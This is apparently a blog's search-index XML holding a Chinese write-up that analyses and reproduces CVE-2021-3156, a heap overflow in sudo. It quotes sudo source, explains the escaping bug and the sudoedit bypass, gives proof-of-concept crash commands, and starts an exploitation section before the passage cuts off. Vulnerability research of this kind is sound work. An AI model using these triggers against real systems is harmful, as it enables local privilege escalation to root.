<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2021-3156 分析复现</title>
      <link href="/2023/05/22/cve-2021-3156-fen-xi-fu-xian/"/>
      <url>/2023/05/22/cve-2021-3156-fen-xi-fu-xian/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>sudo是Linux中一个非常重要的管理权限的软件，它允许用户使用 root 权限来运行程序。CVE-2021-3156是sudo中存在一个堆溢出漏洞,允许任意普通用户获取到root权限.</p><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>Linux版本:Ubuntu GLIBC 2.27-3ubuntu1.4<br>Sudo版本:1.8.21<br>glibc版本:2.27<br>调试器:gdb-pwngdb、pwndbg</p><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305212008266.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞产生的主要原因是sudo程序在shell模式下对参数处理的转义操作可被绕过,在参数未转义的情况下执行反转义操作,再加上特殊布置导致堆溢出.</p><h3 id="第一次转义-转义"><a href="#第一次转义-转义" class="headerlink" title="第一次转义(转义)"></a>第一次转义(转义)</h3><p>在main函数中的phase_args函数对参数进行分析,设定运行模式和运行标志,再对参数进行转义.在此处我们仅分析转义部分.</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span><span class="token function">parse_args</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>nargc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>nargv<span class="token punctuation">,</span>    <span class="token keyword">struct</span> sudo_settings <span class="token operator">*</span><span class="token operator">*</span>settingsp<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>env_addp<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token comment" spellcheck="true">/*     * For shell mode we need to rewrite argv     */</span>     <span class="token comment" spellcheck="true">//进行转义的条件.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ISSET</span><span class="token punctuation">(</span>mode<span class="token punctuation">,</span> MODE_RUN<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ISSET</span><span class="token punctuation">(</span>flags<span class="token punctuation">,</span> MODE_SHELL<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>av<span class="token punctuation">,</span> <span class="token operator">*</span>cmnd <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> ac <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">/* shell -c "command" */</span>        <span class="token comment" spellcheck="true">//以所有参数字符串的长度之和的二倍开辟空间.</span>        <span class="token keyword">char</span> <span class="token operator">*</span>src<span class="token punctuation">,</span> <span class="token operator">*</span>dst<span class="token punctuation">;</span>        size_t cmnd_size <span class="token operator">=</span> <span class="token punctuation">(</span>size_t<span class="token punctuation">)</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span>argc <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span>        <span class="token function">strlen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>argc <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        cmnd <span class="token operator">=</span> dst <span class="token operator">=</span> <span class="token function">reallocarray</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> cmnd_size<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cmnd <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token function">sudo_fatalx</span><span class="token punctuation">(</span><span class="token function">U_</span><span class="token punctuation">(</span><span class="token string">"%s: %s"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">__func__</span><span class="token punctuation">,</span> <span class="token function">U_</span><span class="token punctuation">(</span><span class="token string">"unable to allocate memory"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">gc_add</span><span class="token punctuation">(</span>GC_PTR<span class="token punctuation">,</span> cmnd<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//遍历每一个参数字符串</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>av <span class="token operator">=</span> argv<span class="token punctuation">;</span> <span class="token operator">*</span>av <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> av<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//遍历每一个参数字符串中的字符</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>src <span class="token operator">=</span> <span class="token operator">*</span>av<span class="token punctuation">;</span> <span class="token operator">*</span>src <span class="token operator">!=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span> src<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">/* quote potential meta characters */</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isalnum</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span><span class="token operator">*</span>src<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>src <span class="token operator">!=</span> <span class="token string">'_'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>src <span class="token operator">!=</span> <span class="token string">'-'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>src <span class="token operator">!=</span> <span class="token string">'$'</span><span class="token punctuation">)</span>            <span class="token operator">*</span>dst<span class="token operator">++</span> <span class="token operator">=</span> <span class="token string">'\\'</span><span class="token punctuation">;</span>            <span class="token operator">*</span>dst<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>src<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token operator">*</span>dst<span class="token operator">++</span> <span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cmnd <span class="token operator">!=</span> dst<span class="token punctuation">)</span>        dst<span class="token operator">--</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* replace last space with a NUL */</span>        <span class="token operator">*</span>dst <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>        ac <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* -c cmnd */</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>转义操作的核心部分在这里,在每一个参数字符串中的特殊符号之前加上转义符号\,并将所有参数写入刚分配的dst中,不同参数之间以空格分开.</p><pre class=" language-c"><code class="language-c">        <span class="token comment" spellcheck="true">//遍历每一个参数字符串</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>av <span class="token operator">=</span> argv<span class="token punctuation">;</span> <span class="token operator">*</span>av <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> av<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//遍历每一个参数字符串中的字符</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>src <span class="token operator">=</span> <span class="token operator">*</span>av<span class="token punctuation">;</span> <span class="token operator">*</span>src <span class="token operator">!=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span> src<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">/* quote potential meta characters */</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isalnum</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span><span class="token operator">*</span>src<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>src <span class="token operator">!=</span> <span class="token string">'_'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>src <span class="token operator">!=</span> <span class="token string">'-'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>src <span class="token operator">!=</span> <span class="token string">'$'</span><span class="token punctuation">)</span>            <span class="token operator">*</span>dst<span class="token operator">++</span> <span class="token operator">=</span> <span class="token string">'\\'</span><span class="token punctuation">;</span>            <span class="token operator">*</span>dst<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>src<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token operator">*</span>dst<span class="token operator">++</span> <span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span></code></pre><h3 id="第二次转义-反转义"><a href="#第二次转义-反转义" class="headerlink" title="第二次转义(反转义)"></a>第二次转义(反转义)</h3><h4 id="调用链分析"><a href="#调用链分析" class="headerlink" title="调用链分析"></a>调用链分析</h4><p>程序沿以下调用链最终在set_cmnd中进行反转义操作.</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">policy_check</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>        <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">sudoers_policy_check</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>            <span class="token keyword">int</span> <span class="token function">sudoers_policy_main</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>                <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">set_cmnd</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span></code></pre><p>ps:由于其中的部分跳转是以函数指针的方式跳转的,需要通过动态调试来追踪函数调用链.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305191725019.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305191715729.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305191719242.png"></p><h4 id="关键代码"><a href="#关键代码" class="headerlink" title="关键代码"></a>关键代码</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">int</span><span class="token function">set_cmnd</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token comment" spellcheck="true">/* set user_args */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>NewArgc <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">char</span> <span class="token operator">*</span>to<span class="token punctuation">,</span> <span class="token operator">*</span>from<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token operator">*</span>av<span class="token punctuation">;</span>        size_t size<span class="token punctuation">,</span> n<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/* Alloc and build up user_args. */</span>        <span class="token comment" spellcheck="true">//分配所有参数(长度+1)求和大小的空间</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> av <span class="token operator">=</span> NewArgv <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">*</span>av<span class="token punctuation">;</span> av<span class="token operator">++</span><span class="token punctuation">)</span>        size <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">*</span>av<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span>user_args <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">sudo_warnx</span><span class="token punctuation">(</span><span class="token function">U_</span><span class="token punctuation">(</span><span class="token string">"%s: %s"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">__func__</span><span class="token punctuation">,</span> <span class="token function">U_</span><span class="token punctuation">(</span><span class="token string">"unable to allocate memory"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">debug_return_int</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ISSET</span><span class="token punctuation">(</span>sudo_mode<span class="token punctuation">,</span> MODE_SHELL<span class="token operator">|</span>MODE_LOGIN_SHELL<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">/*         * When running a command via a shell, the sudo front-end         * escapes potential meta chars.  We unescape non-spaces         * for sudoers matching and logging purposes.         */</span>         <span class="token comment" spellcheck="true">//遍历每一个参数进行转义.</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>to <span class="token operator">=</span> user_args<span class="token punctuation">,</span> av <span class="token operator">=</span> NewArgv <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">(</span>from <span class="token operator">=</span> <span class="token operator">*</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span> av<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">*</span>from<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>from<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\\'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isspace</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span>from<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                from<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token operator">*</span>to<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>from<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token operator">*</span>to<span class="token operator">++</span> <span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token operator">*</span><span class="token operator">--</span>to <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>to <span class="token operator">=</span> user_args<span class="token punctuation">,</span> av <span class="token operator">=</span> NewArgv <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">*</span>av<span class="token punctuation">;</span> av<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            n <span class="token operator">=</span> <span class="token function">strlcpy</span><span class="token punctuation">(</span>to<span class="token punctuation">,</span> <span class="token operator">*</span>av<span class="token punctuation">,</span> size <span class="token operator">-</span> <span class="token punctuation">(</span>to <span class="token operator">-</span> user_args<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">>=</span> size <span class="token operator">-</span> <span class="token punctuation">(</span>to <span class="token operator">-</span> user_args<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">sudo_warnx</span><span class="token punctuation">(</span><span class="token function">U_</span><span class="token punctuation">(</span><span class="token string">"internal error, %s overflow"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">__func__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">debug_return_int</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            to <span class="token operator">+</span><span class="token operator">=</span> n<span class="token punctuation">;</span>            <span class="token operator">*</span>to<span class="token operator">++</span> <span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token operator">*</span><span class="token operator">--</span>to <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="溢出点"><a href="#溢出点" class="headerlink" title="溢出点"></a>溢出点</h4><p>溢出点发生在这里.该部分依次遍历参数列表,去掉参数中的转义字符’\‘.</p><pre class=" language-c"><code class="language-c">        <span class="token comment" spellcheck="true">/*         * When running a command via a shell, the sudo front-end         * escapes potential meta chars.  We unescape non-spaces         * for sudoers matching and logging purposes.         */</span>         <span class="token comment" spellcheck="true">//遍历每一个参数进行转义.</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>to <span class="token operator">=</span> user_args<span class="token punctuation">,</span> av <span class="token operator">=</span> NewArgv <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">(</span>from <span class="token operator">=</span> <span class="token operator">*</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span> av<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">*</span>from<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>from<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\\'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isspace</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span>from<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                from<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token operator">*</span>to<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>from<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token operator">*</span>to<span class="token operator">++</span> <span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token operator">*</span><span class="token operator">--</span>to <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span></code></pre><p>抛开第一次转义的操作,想象一下如果NewArgv中的一个参数字符是以’\‘符号结尾的会发生什么.(需要注意的是,isspace(0)返回的是0,‘\x00’并不是空白符)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305201826142.png"><br>可以看到的是,在第一次while循环结束后,1)向目标缓冲区写入了一个null字节 2)from已经跳过了当前参数的结束符’\x00’,指向了下一个参数的头部,如果下一个参数不为空的话,while循环将继续进行复制直到下一个参数复制结束.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305201828111.png"><br>当跳出内层的while循环,进行下一次上层for循环时,from指针又会取出刚刚已经复制过的next_arg的地址再次进行复制,而to指针不会复原,很明显,这便会造成堆溢出.<br>下面是最终溢出后的场景,红色虚线右边便是溢出的部分.不考虑堆对齐,仅从数据长度分析,溢出的长度应该是strlen(next_arg).(strlen求出的长度不包括结束符)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305201844985.png"></p><h3 id="条件分析"><a href="#条件分析" class="headerlink" title="条件分析"></a>条件分析</h3><p>虽然我们已经完成了堆溢出的分析,但是很可惜,我们的工作是在假设绕过了parse_args的第一次转义操作之后进行的.接下来我们继续分析该绕过是否可行.</p><p>第一次转义的条件有:</p><pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ISSET</span><span class="token punctuation">(</span>mode<span class="token punctuation">,</span> MODE_RUN<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ISSET</span><span class="token punctuation">(</span>flags<span class="token punctuation">,</span> MODE_SHELL<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>第二次反转义的条件有:</p><pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ISSET</span><span class="token punctuation">(</span>sudo_mode<span class="token punctuation">,</span> MODE_SHELL<span class="token operator">|</span>MODE_LOGIN_SHELL<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span>sudo_mode <span class="token operator">&amp;</span> <span class="token punctuation">(</span>MODE_RUN <span class="token operator">|</span> MODE_EDIT <span class="token operator">|</span> MODE_CHECK<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>观察发现,绕过转义执行反转义的条件为</p><pre class=" language-c"><code class="language-c">MODE_SHELL <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>MODE_RUN  <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>MODE_EDIT <span class="token operator">||</span> MODE_CHECK<span class="token punctuation">)</span></code></pre><p>现在回到我们之前跳过的phase_args函数的模式和标志设定:<br>(只给出与所需条件有关部分)</p><pre class=" language-c"><code class="language-c">        <span class="token keyword">case</span> <span class="token string">'i'</span><span class="token punctuation">:</span>            sudo_settings<span class="token punctuation">[</span>ARG_LOGIN_SHELL<span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">"true"</span><span class="token punctuation">;</span>            <span class="token function">SET</span><span class="token punctuation">(</span>flags<span class="token punctuation">,</span> MODE_LOGIN_SHELL<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'s'</span><span class="token punctuation">:</span>            sudo_settings<span class="token punctuation">[</span>ARG_USER_SHELL<span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">"true"</span><span class="token punctuation">;</span>            <span class="token function">SET</span><span class="token punctuation">(</span>flags<span class="token punctuation">,</span> MODE_SHELL<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'e'</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>mode <span class="token operator">&amp;&amp;</span> mode <span class="token operator">!=</span> MODE_EDIT<span class="token punctuation">)</span>            <span class="token function">usage_excl</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            mode <span class="token operator">=</span> MODE_EDIT<span class="token punctuation">;</span>            sudo_settings<span class="token punctuation">[</span>ARG_SUDOEDIT<span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">"true"</span><span class="token punctuation">;</span>            valid_flags <span class="token operator">=</span> MODE_NONINTERACTIVE<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//这里的MODE_LIST会在之后转化为MODE_CHECK.</span>        <span class="token keyword">case</span> <span class="token string">'l'</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>mode<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>mode <span class="token operator">==</span> MODE_LIST<span class="token punctuation">)</span>                <span class="token function">SET</span><span class="token punctuation">(</span>flags<span class="token punctuation">,</span> MODE_LONG_LIST<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span>                <span class="token function">usage_excl</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            mode <span class="token operator">=</span> MODE_LIST<span class="token punctuation">;</span>            valid_flags <span class="token operator">=</span> MODE_NONINTERACTIVE<span class="token operator">|</span>MODE_LONG_LIST<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment" spellcheck="true">//最后还有个判断条件需要绕过.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>flags <span class="token operator">&amp;</span> valid_flags<span class="token punctuation">)</span> <span class="token operator">!=</span> flags<span class="token punctuation">)</span>    <span class="token function">usage</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>可以发现,不管设置-e还是-l,都无法绕过对valid_flags的判断.<br>这条路仿佛被堵死了,但搜索对MODE_EDIT的引用,发现这样一段代码.</p><pre class=" language-c"><code class="language-c">    <span class="token comment" spellcheck="true">/* First, check to see if we were invoked as "sudoedit". */</span>    proglen <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>progname<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>proglen <span class="token operator">></span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>progname <span class="token operator">+</span> proglen <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">"edit"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    progname <span class="token operator">=</span> <span class="token string">"sudoedit"</span><span class="token punctuation">;</span>    mode <span class="token operator">=</span> MODE_EDIT<span class="token punctuation">;</span>    sudo_settings<span class="token punctuation">[</span>ARG_SUDOEDIT<span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">"true"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>当程序以sudoedit方式启动时,可以直接设置MODE_EDIT位而不设置valid_flag.<br>(sudoedit是sudo的符号链接)</p><h3 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h3><p>分析完所有条件,尝试Poc: </p><pre class=" language-sh"><code class="language-sh">sudoedit -s '\' AAAAAAAAAAAAAAAA</code></pre><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305201946967.png"><br>可以看见命令sudoedit -s ‘' AAAAAAAAAAAAAAAA成功堆溢出且造成了程序Crash.<br>Qualys 漏洞团队给出的官方Poc为:<br>由于环境不同,这段Poc在我的实验环境下并没有在malloc时触发corrupt,不过也导致了crash.</p><pre class=" language-sh"><code class="language-sh">sudoedit -s '\' `perl -e 'print "A" x 65536'`</code></pre><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="攻击者视角下的溢出"><a href="#攻击者视角下的溢出" class="headerlink" title="攻击者视角下的溢出"></a>攻击者视角下的溢出</h3><p>在Qualys漏洞团队的漏洞披露中,这个溢出相当理想<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305201959058.png"></p><ol><li>可以控制user_args堆内存的长度.</li></ol><pre class=" language-c"><code class="language-c">        <span class="token keyword">for</span> <span class="token punctuation">(</span>size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> av <span class="token operator">=</span> NewArgv <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">*</span>av<span class="token punctuation">;</span> av<span class="token 